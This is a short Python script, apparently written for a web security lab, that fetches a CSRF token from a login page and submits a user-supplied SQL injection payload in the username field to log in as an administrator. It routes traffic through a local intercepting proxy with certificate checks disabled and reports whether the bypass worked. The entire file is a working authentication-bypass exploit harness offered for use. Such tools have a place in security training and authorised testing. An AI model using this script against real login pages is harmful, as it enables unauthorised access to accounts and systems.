


import requests
import urllib3
import sys
from bs4 import BeautifulSoup as bs 


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
s=requests.Session()

def get_csrf_token(s, url):
    response = s.get(url, proxies=proxies, verify=False)
    soup = bs(response.text, "html.parser")
  
# Find the CSRF token
    csrf_token = soup.find("input", {"name": "csrf"})  # Find the input field with name="csrf"

    if csrf_token and "value" in csrf_token.attrs:
        return csrf_token['value']
    else:
        print("CSRF Token not found!")
        
    
def sql_exploit(s,url,payload):
    csrf=get_csrf_token(s,url)
    data={'csrf':csrf,
          'username':payload,
          'password':'anything'}
    r=s.post(url,data=data,verify=False,proxies=proxies)
    res=r.text
    if 'Log out' in res:
        return True
    else:
        return False
    
    
if __name__ =="__main__":
    
    try:
        url=input("Please enter url : ")
        payload=input("Please enter your payload : ")
        
    except IndexError:
        print("Please provide valid input ")
        
   
    
    if sql_exploit(s,url,payload):
        print(f"[+] SQL injection successful you have login as a Administrator ")
        
    else:
        print(f"[-] SQL Injection unsuccessful ")
        
        
    